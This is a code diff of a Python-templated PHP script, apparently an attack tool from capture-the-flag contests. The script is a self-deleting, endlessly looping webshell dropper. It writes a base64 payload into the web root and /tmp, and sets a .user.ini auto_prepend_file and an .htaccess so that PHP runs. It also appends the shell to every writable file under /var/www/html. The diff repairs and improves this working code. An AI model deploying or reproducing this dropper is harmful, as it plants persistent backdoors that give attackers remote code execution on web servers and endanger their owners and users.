@@ -1,38 +1,43 @@
 
 file='''<?php
-function rscandir($dir,$count=0){
-    global $files;
-    if($count<=2){
-        foreach(glob($dir) as $path){
-            $tmp_path = implode('/',[$dir,$path]);
-            if(is_dir($tmp_path)){
-                rscandir($tmp_path);
-            } else {
-                $files[] = $tmp_path;
+function filescan($dir){
+    $files = [];
+    foreach(scandir($dir) as $path){
+        if($path!='.'&&$path!='..'){
+            if(is_dir($path)){
+                foreach(scandir($dir.'/'.$path) as $path2){
+                    if($path2!='.'&&$path2!='..'){
+                        $files[] = $dir.'/'.$path.'/'.$path2;
+                    }
+                    
+                }
             }
+            $files[] = $dir.'/'.$path;
+            
         }
     }
+   return $files;
 }
+
 function writeshell($file,$shell){
     if(is_dir($file)){
-        $shellname = '.pops.php';
+        $shellname = $file.'/.pops.php';
         $rst = file_put_contents($shellname,$shell);
     } else{
-        
-        $rst = file_put_contents($file,$shell,FILE_APPEND);
+        $rst = file_put_contents($file,'?>'.$shell,FILE_APPEND);
     }
-    if($rst)return $shellname?$shellname:$file;
+    if($rst){
+        return $shellname?$shellname:$file;
+        }
 }
-$shell = base64_decode('{content}');
 function undie(){
+    $content = base64_decode('{content}');
     set_time_limit(0);
     ignore_user_abort(1); #1表示，忽略与客户端断开连接，继续执行脚本
     unlink(__FILE__); #执行完后删除自身
-    $files = array();
-    rscandir('/var/www/html/');
     while (1) {
-        file_put_contents("/var/www/html/.pops.php", $file);
-        file_put_contents("/tmp/sess_adasdifsdfijjiji", $file);
+        file_put_contents("/var/www/html/.pops.php", $content);
+        file_put_contents("/tmp/sess_adasdifsdfijjiji", $content);
         file_put_contents('/var/www/html/.user.ini','auto_prepend_file=/tmp/sess_adasdifsdfijjiji');
         file_put_contents('/var/www/html/.htaccess','<Files .htaccess>
         SetHandler application/x-httpd-php
@@ -43,12 +48,13 @@ function undie(){
         le .htaccess
         #'.$shell);
         $shell = [];
-        foreach($files as $file){
+        foreach(filescan('/var/www/html/') as $file){
             if(is_writable($file)){
-                $shell[] = writeshell($file,$shell);
+                $shell[] = writeshell($file,$content);
             }
         }
         print_r(json_encode($shell));
+        sleep(1);
     }
 }
 
